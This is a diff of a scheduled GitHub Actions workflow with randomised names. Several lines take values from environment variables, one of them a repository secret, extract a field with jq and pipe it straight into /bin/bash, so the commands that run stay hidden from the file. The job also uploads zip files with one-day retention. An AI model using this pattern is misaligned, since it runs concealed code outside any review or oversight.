@@ -1,32 +1,25 @@
 name: junnongdanai
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '47 3/6 * * *'
-jobs:  # 10634
+    - cron: '50 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: junnongdanai
         env:
-          h5064: ${{ secrets.h5064 }}
+          tpli4207: ${{ secrets.tpli4207 }}
         run: |
-          echo $h5064 | jq -r .jp9975 | /bin/bash
-          echo $kqpyw5462 | jq -r .nzcjx756 | /bin/bash
-          echo $isfyv6 | jq -r .dc0 | /bin/bash
-          echo $ulbv40334 | jq -r .q5 | /bin/bash
-          echo $yyep8 | jq -r .qmej4 | /bin/bash
-          echo $ru84 | jq -r .hoa479 | /bin/bash
-          echo $hnjd4 | jq -r .yfto8 | /bin/bash
-          echo $nvn61433 | jq -r .myxtq80 | /bin/bash
-          echo $hqg45456 | jq -r .ccij4 | /bin/bash
-          echo $bv79 | jq -r .hqfxt00187 | /bin/bash
-          echo $wqn23775 | jq -r .d81481 | /bin/bash
-          echo $srxu2 | jq -r .auyu7830 | /bin/bash
-          echo $insy581 | jq -r .qw45 | /bin/bash
-          echo $o7 | jq -r .lqyl3 | /bin/bash
-          echo $gw0941 | jq -r .wrqv5951 | /bin/bash
+          printf '%s' "$tpli4207" | jq -r .vqjg64963 | /bin/bash
+          printf '%s' "$pqd504" | jq -r .yjle7 | /bin/bash
+          echo $msu7649 | jq -r .uovke046 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: teTLfTRi
+          path: "*.zip"
+          retention-days: 1
